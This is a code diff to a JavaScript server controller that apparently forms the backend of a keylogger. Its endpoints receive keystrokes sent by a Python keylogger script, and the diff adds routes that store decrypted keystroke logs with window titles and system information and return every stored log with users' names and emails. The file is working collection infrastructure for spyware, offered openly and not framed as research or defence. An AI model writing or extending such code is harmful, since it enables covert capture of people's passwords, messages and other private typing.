@@ -1,9 +1,8 @@
-// path: server/controllers/keyloggerController.js
-
 import KeyloggerModel from "../models/keyloggerModel.js";
 import userModel from "../models/userModel.js";
+import DecryptedKeyloggerModel from "../models/DecryptedKeyloggerModel.js";
 
-// 📌 Called by the Python keylogger script to save data
+// Called by the Python keylogger script to save data
 export const saveKeystrokes = async (req, res) => {
   try {
     const {
@@ -56,7 +55,7 @@ export const saveKeystrokes = async (req, res) => {
   }
 };
 
-// 📌 Called by frontend (Admin or User) to get logs
+//  Called by frontend (Admin or User) to get logs
 export const getKeystrokes = async (req, res) => {
   try {
     const { userId } = req.query; // ✅ GET method = use req.query
@@ -78,5 +77,42 @@ export const getKeystrokes = async (req, res) => {
       success: false,
       message: error.message,
     });
+  }
+};
+
+//saving decrypted logs
+export const saveDecryptedKeystrokes = async (req, res) => {
+  try {
+    const { userId, keystrokes, windowTitle, timestamp, systemInfo } = req.body;
+
+    if (!userId || !keystrokes || !windowTitle) {
+      return res
+        .status(400)
+        .json({ success: false, message: "Missing fields" });
+    }
+
+    await DecryptedKeyloggerModel.create({
+      userId,
+      keystrokes,
+      windowTitle,
+      createdAt: timestamp ? new Date(timestamp * 1000) : new Date(),
+      systemInfo,
+    });
+
+    res.status(201).json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+};
+
+//download decrypted logs
+export const getDecryptedKeystrokes = async (req, res) => {
+  try {
+    const logs = await DecryptedKeyloggerModel.find()
+      .sort({ createdAt: -1 })
+      .populate("userId", "name email");
+    res.json({ success: true, logs });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
   }
 };
